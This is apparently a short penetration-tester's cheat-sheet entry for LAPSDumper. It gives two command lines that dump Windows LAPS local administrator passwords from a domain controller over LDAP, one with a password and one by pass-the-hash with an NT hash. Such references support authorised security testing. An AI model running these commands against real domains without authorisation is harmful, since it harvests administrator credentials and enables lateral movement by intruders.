# LAPSDumper (imp)

% LAPS, windows, ldap

## dump LAPS (creds)
#plateform/linux #target/remote #cat/POSTEXPLOIT/CREDS_RECOVER 
https://github.com/n00py/LAPSDumper
```bash
laps.py -u <user> -p <password> -d <domain> -l <dc_ip>
```

## dump LAPS (pth)
#plateform/linux #target/remote #cat/POSTEXPLOIT/CREDS_RECOVER 
https://github.com/n00py/LAPSDumper
```bash
laps.py -u <user> -p :<nt_hash> -d <domain> -l <dc_ip>
```